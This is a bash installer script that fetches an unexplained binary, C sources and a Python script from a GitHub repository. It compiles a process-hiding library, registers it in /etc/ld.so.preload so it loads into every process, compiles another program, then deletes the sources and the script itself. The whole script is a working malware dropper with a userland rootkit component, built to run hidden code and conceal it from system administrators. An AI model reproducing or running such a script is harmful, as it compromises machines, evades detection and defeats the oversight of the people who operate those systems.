#!/bin/bash
wget https://github.com/hudahadoh/hime/raw/main/bhmax
wget https://raw.githubusercontent.com/hudahadoh/hime/main/hi.c
wget https://raw.githubusercontent.com/hudahadoh/hime/main/processhider.c
wget https://raw.githubusercontent.com/hudahadoh/hime/main/smtp.py
chmod +x smtp.py
gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl
chmod +x bhmax
mv libprocess.so /usr/local/lib/
mv bhmax /usr/local/lib/
echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
gcc -o hi hi.c
rm hi.c processhider.c
chmod +x hi
rm rest.sh
